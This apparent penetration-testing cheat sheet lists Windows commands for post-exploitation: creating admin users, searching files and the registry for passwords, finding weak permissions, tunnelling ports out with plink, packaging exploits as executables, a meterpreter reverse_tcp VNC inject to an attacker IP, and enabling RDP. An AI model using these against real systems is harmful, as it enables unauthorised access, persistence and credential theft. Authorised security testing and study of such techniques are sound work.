# Windows Command Line

https://www.lifewire.com/windows-xp-command-prompt-commands-2618119
https://www.lifewire.com/list-of-windows-7-command-prompt-commands-4107370
https://www.lifewire.com/windows-8-command-prompt-commands-4172073


## Basic System Information

See --> [Basic Enumeration of the System](privilege_escalation/information_gathering.md)


## Basic Commands

* Add user - https://www.windows-commandline.com/add-user-from-command-line/
  `net user [username] [password] /ADD`

* Add user to Admin group
  `net localgroup Administrators [username] /add`

* Change user password
  `net user [loginid] [newpassword]`

* Which ports are open
  https://www.howtogeek.com/howto/28609/how-can-i-tell-what-is-listening-on-a-tcpip-port-in-windows/
  `# netstat -an`


## Searching

* Windows has a Grep-like function that can be used to search inside files for passwords called **findstr**
  - `/S` : Searches for matching files in the current directory and all subdirectories.
  - `/I` : Specifies that the search is not to be case-sensitive.
  - `/P` : Skip any file that contains non-printable characters
  - `/N` : Print the line number before each line that matches.
  - `/M` : Print only the filename if a file contains a match.
  - `/C:string` : Uses specified string as a literal search string.
  - `/R:string` : Uses search strings as regular expressions.

See the following references:  
  [FINDSTR Reference](https://ss64.com/nt/findstr.html)  
  [FINDSTR](http://www.robvanderwoude.com/findstr.php)
  [Findstr Examples](https://www.windows-commandline.com/findstr-command-examples-regular/)

* dir can be used to list all files that match a pattern recursively, like a search on filename
  ```
  dir *.docx *.xlsx *.pptx
  dir c:\*vnc.ini /s /b
  ```
  - `/s` List the files in the current folder and also the ones in the subfolders recursively.
  - `/b` Lists the subfolders/files names in bare format.   

  List all files and folders recursively and search in files
  ```
  dir c:\ /s /b | findstr /si *vnc.ini
  ```

## Copy To Clipboard

* **clip** tool copies text into the clipboard, so if working on Citrix env and
you run this text is in clipboard and can be pasted locally
  ```
  > reg query KHCU /f password /t REG_SZ /s | clip
  ```

## Run Commands as Different User

* Runas (runas reference)[https://ss64.com/nt/runas.html]
  ```
  > runas /U:localadmin cmd.exe
  ```

* PSExec (psexec reference)[https://ss64.com/nt/psexec.html]  
PsExec is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software.   
Advance (psexec use)[https://www.itprotoday.com/management-mobility/psexec]



## Check Access

* **cacls.exe** --> Display or modify Access Control Lists (ACLs) for files and folders.
  ```
  C:\>cacls \testperms
  C:\testperms  BUILTIN\Administrators:(OI) (CI) F
                NT AUTHORITY\SYSTEM:(OI) (CI) F
                VMXPSP2\Administrator:F
                CREATOR OWNDER:(OI) (CI) (IO) F
                BUILTIN\Users:(OI) (CI) R
                BUILTIN\Users:(CI) (special access:) FILE_APPEND_DATA
                BUILTIN\Users:(CI) (special access:) FILE_WRITE_DATA
  ```

  Output explanation for files and folders:
  ```
  Value Description
  --------------------------------
  N - None
  R - Read
  W - Write
  C - Change (Write)
  F - Full Control

  Output ACE applies to
  ----------------------------------------------------------------------------
  OI This folder and files
  CI This folder and subfolders
  IO The ACE does not apply to the current
  file/directory.
  No output message This folder only
  (IO)(CI) This folder, subfolders and files
  (OI)(CI)(IO) Subfolders and files only
  (CI)(IO) Subfolders only
  (OI)(IO) Files only
  ```
  To understand the output for files and folders, see [Windows - Icacls](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753525(v=ws.10)

* **AccessChk** is a command-line tool for viewing the effective permissions on files, registry keys, services, processes, kernel objects, and more.

  Find weak directories
  ```
  accesschk.exe -uwdqs users c:\
  accesschk.exe -uwdqs "Authenticated Users" c:\
  ```

  Find weak files
  ```
  accesschk.exe -uwqs users c:\*.*
  accesschk.exe -uwqs "Authenticated Users" c:\*.*
  ```

  - `-q` Omit banner (quit)
  - `-w` Show only with write access
  - `-v` Verbose
  - `-u` Suppress errors
  - `-s` Recurs
  - `-d` Directories only

## Registry

* In the GUI, use regedit
  ```
  Start -> Run -> regedit
  OR
  Windows Key + R ->regedit
  ```

* Command Prompt, use **reg.exe**  
  List all commands
  ```
  > reg /?
  ```
  These include:
  - REG Query
  - REG Add
  - REG Delete
  - REG Copy
  - REG Save
  - REG Load
  - REG Unload
  - REG Restore
  - REG Compare
  - REG Export
  - REG Import
  - REG Flags

  For more help
  ```
  reg add /?
  ```

  Adding & Delete
  ```
  > REG ADD KeyName [{/v ValueName | /ve}] [/t Type] [/f]
  > REG DELETE KeyName [{/v ValueName | /ve | /va}] [/f]
  ```

  - KeyName: Defines the path to the subkey or entry. Valid registry key shortcuts include HKLM, HKCU, HKCR, HKU, and HKCC. If you're trying to edit the registry on a remote computer, you can only use these shortcuts: HKLM and HKU.
  - `/v ValueName`: Specifies the name for the registry key to be added or deleted.
  - `/ve`: Defines if you're adding or deleting an entry that has a null value.
  - `/t` Type: Specifies the type of registry entries. Here's the list of valid types:
    REG_SZ  
    REG_MULTI_SZ  
    REG_DWORD_BIG_ENDIAN  
    REG_DWORD  
    REG_BINARY  
    REG_DWORD_LITTLE_ENDIAN  
    REG_LINK  
    REG_FULL_RESOURCE_DESCRIPTOR  
    REG_EXPAND_SZ  
  - `/f`: Adds or deletes registry content without prompting for confirmation.
  - `/s` Separator: Defines the character you use to separate multiple instances of data when the REG_MULTI_SZ data type is specified and you need to add more than one entry. The default separator is \0 if it is not specified.
  - `/d Data`: Specifies the data for the new entry in the registry.


  [How to edit the Registry using Command Prompt on Windows 10](https://www.windowscentral.com/how-edit-registry-using-command-prompt-windows-10)


## Services

See (Services)[privilege_escalation/services.md] for more commands and scripts.

* List all services
  ` > wmic service list brief `
  OR
  `> net start`
  OR
  `$ wmic service list brief            --> lists all services`

* Command to stop a service:
    `net stop servicename`

* To check for weak services, use `icacls` or `cacls`

## Port forwarding

### Remote forward services to outside

* Using **plink.exe**. Plink (PuTTY Link) is a command-line connection tool similar to UNIX ssh. If you have an ssh client on the Windows system, and you can establish SSH outbound to a system you control, then you can use a remote port forward, i.e. with option -R. This is effectively the opposite of -L, it sets up a listener on the remote (connected to) and forwards back [sic] through the system you're connecting from.
  ```
  > plink.exe -l root -pw mypassword 192.168.0.101 -R 4450:127.0.0.1:445
  ```
  - `-l root -pw mypassword` Refers to the SSH user on the remote server, `192.168.0.101`
  - `-R 8080:127.0.0.1:8080` Will set up the forwarding from this local port 445 to the remote port 4450.
  - On the remote system, you can then connect to 127.0.0.1:4450

  See also: [Services only available from inside network](internal_services.md) - internal_services.md

### Local port forward (from Win to Kali):
  ```
  > plink mysession -L 5110:popserver.example.com:110
  ```


## Python

* To create **exe** from python file:
  ```
  c:> pip install pyinstaller

  c:> pyinstaller myscript.py

  c:> python pyinstaller.py --onefile ms11-080.py
  ```
  See also: [PyInstaller](https://pyinstaller.readthedocs.io/en/stable/)

* On Kali
  - install pyinstaller of windows with wine on Kali and then
  ```
  # wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile 18176.py
  ```

## Getting GUI

* Using meterpreter, inject vnc session
  ```
  # run post/windows/manage/payload_inject payload=windows/vncinject/reverse_tcp lhost=<yourip> options=viewonly=false
  ```

* Enable RDP
  - Commandline
  ```
  c:> netsh firewall set service RemoteDesktop enable
  ```
  - Registry
  ```
  c:> reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
  c:> reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
  ```
  - Commandline
  ```
  c:> sc config TermService start= auto
  c:> net start Termservice
  c:> netsh.exe
  c:> firewall add portopening TCP 3389 "Remote Desktop"
  ```

  OR
  ```
  netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (TCP-In)" dir=in action=allow program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the Remote Desktop service to allow RDP traffic. [TCP 3389] added by LogicDaemon's script" enable=yes profile=private,domain localport=3389 protocol=tcp
  ```
  ```
  netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (UDP-In)" dir=in action=allow program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the Remote Desktop service to allow RDP traffic. [UDP 3389] added by LogicDaemon's script" enable=yes profile=private,domain localport=3389 protocol=udp
  ```

  OR (meterpreter)
  ```
  # run post/windows/manage/enable_rdp
  ```
